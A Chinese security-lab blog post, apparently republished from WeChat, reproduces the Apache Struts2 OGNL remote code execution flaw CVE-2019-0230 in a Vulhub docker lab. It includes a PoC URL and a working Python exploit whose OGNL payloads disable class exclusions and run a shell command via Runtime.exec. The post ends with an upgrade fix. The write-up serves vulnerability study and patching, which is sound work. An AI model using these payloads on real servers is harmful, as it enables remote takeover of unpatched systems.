\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/uEfkaDS6G5YJ-w1vywZypw)

  

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x00 漏洞简述**  

  

  

 2020 年 08 月 13 日，Apache 官方发布了 Struts2 远程代码执行漏洞的风险通告，该漏洞编号为 CVE-2019-0230，漏洞等级：高危，漏洞评分：8.5。

漏洞产生的主要原因是因为 Apache Struts 框架在强制执行时，会对分配给某些标签属性 (如 id) 的属性值执行二次 ognl 解析。攻击者可以通过构造恶意的 OGNL 表达式，并将其设置到可被外部输入进行修改，且会执行 OGNL 表达式的 Struts2 标签的属性值，引发 OGNL 表达式解析，最终造成远程代码执行的影响。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x01 影响版本**

  

  

Apache Struts2：2.0.0-2.5.20

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x02 漏洞复现**

  

  

虚拟机部署 docker 安装 Vulhub 一键搭建漏洞测试靶场环境。

```
docker-compose up -d
```

1、访问漏洞环境

    ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDpKMiaZgicTGpaXLcEoibHf6a7e8LfVqWGFxTbOrWHb5YuUTqdC2A3icmmIMFdnvh7ick5ovVnw5yl5wg/640?wx_fmt=png)               

2、POC 验证，传入 ognl 表达式的 poc： **%{yun\*zui}** 这里需要 URL 编码

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDpKMiaZgicTGpaXLcEoibHf6aWvKMicL20lRruEicDPia2rYofPa3zW2wSqRJl2CD0Vg1ficwKrX4IRUpfQ/640?wx_fmt=png)

http://192.168.60.131:8080/?id=%25%7Byun\*zui%7D

从测试结果可以看到 **id 属性返回了 yun\*zui 的结果，漏洞存在！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDpKMiaZgicTGpaXLcEoibHf6aZtLQCIuJnEp1VXSY76vrtoZCUlK7r7Pjgo7Xfpry7RCqDTL1ibSvIicQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDpKMiaZgicTGpaXLcEoibHf6a7TKt3Xq46GSUS0EmEesbpb7DCRhJ56nYMibtyiavczS2CUE1kQEibtIBg/640?wx_fmt=png)

3、简单 python 脚本进行漏洞利用

```
import requests
url ="http://192.168.60.131:8080"
data1 = {
    "id":"%{(#context=#attr\['struts.valueStack'\].context).(#container=#context\['com.opensymphony.xwork2.ActionContext.container'\]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
}
data2 = {
   "id":"%{(#context=#attr\['struts.valueStack'\].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch/tmp/yunzui'))}"
}
res1 =requests.post(url, data=data1)
# print(res1.text)
res2 = requests.post(url,data=data2)
# print(res2.text)
```

运行完脚本之后，将远程执行

```
touch/tmp/yunzui
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDpKMiaZgicTGpaXLcEoibHf6agazBvgU4TCB1zGkSLhFCnKvYVQxFh8uHFONnoaDRVjccDecFMXYo4Q/640?wx_fmt=png)

4、命令执行结果进入 docker 查看，成功执行

```
docker-compose exec struts2 bash
ls -al /tmp
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDpKMiaZgicTGpaXLcEoibHf6aAyS8gc7WvfYU6xIiaSktc5qDubXOibEzWQ4NvhibjGnQyED8LMqI44FvQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x03 修复建议**

  

  

升级到 Struts2.5.22 或更高版本

或者开启 ONGL 表达式注入保护措施

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x04 参考链接**

  

  

https://cert.360.cn/warning/detail?id=d2b39f48fd31f3b36cc957f23d4777af

https://cwiki.apache.org/confluence/display/WW/S2-059

https://codeload.github.com/vulhub/vulhub/zip/master

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif) 

知识分享完了

喜欢别忘了关注我们哦~  

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg)